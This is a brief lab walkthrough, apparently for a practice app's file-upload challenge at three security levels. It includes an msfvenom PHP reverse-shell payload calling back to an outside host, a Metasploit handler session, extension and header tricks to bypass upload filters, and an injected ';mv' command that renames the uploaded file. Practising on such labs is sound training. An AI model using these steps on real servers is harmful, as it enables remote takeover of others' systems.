# LOW
Upload a reverse shell php file, navigate to the file and it will exectue.

`msfvenom -p php/meterpreter/reverse_tcp lhost=1.2.3.4 lport=9999 -f raw`

```
msf > use multi/handler
msf exploit(handler) > set payload php/meterpreter/reverse_tcp
msf exploit(handler) > set lhost 192.168.1.104
msf exploit(handler) > set lport 3333
msf exploit(handler) > run
meterpreter > sysinfo
```

# MED
Add .jpeg to the reverse shell script filename.  Intercept the upload, change filename to .php.


# HIGH
Add a header to the .jpeg such as GIF98.  Use the command_injection.md to rename the file after upload.

`;mv /path/to/reverse.jpeg /path/to/reverse.php`
